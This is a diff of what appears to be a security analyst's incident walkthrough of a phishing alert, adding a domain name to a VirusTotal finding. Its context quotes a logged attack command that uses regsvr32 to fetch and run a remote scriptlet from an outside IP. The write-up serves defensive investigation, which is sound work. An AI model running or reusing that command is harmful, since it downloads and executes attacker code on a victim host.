@@ -53,7 +53,7 @@ Step-by-step walkthrough of the analysis:
        - Feb 04 2025 08:06:08 - `"C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll"`
    - A matching DNS query was submitted linking to the source IP: `projectmanagement@pm.me`.
    - VirusTotal flagged the IP as malicious (10/91 vendors), associated with SIA RixHost.
-   - VirusTotal flagged the attachment as malicious (10/92 vendors), categorized as Phishing and Other Frauds associated with a domain.
+   - VirusTotal flagged the attachment as malicious (10/92 vendors), categorized as Phishing and Other Frauds, associated with a domain download.cyberlearn.academy.
 
 - Any pivoting done:
   - I searched log management for 84.38.130.118 across all other internal hosts; no additional targets found, indicating this was a single-target attempt.
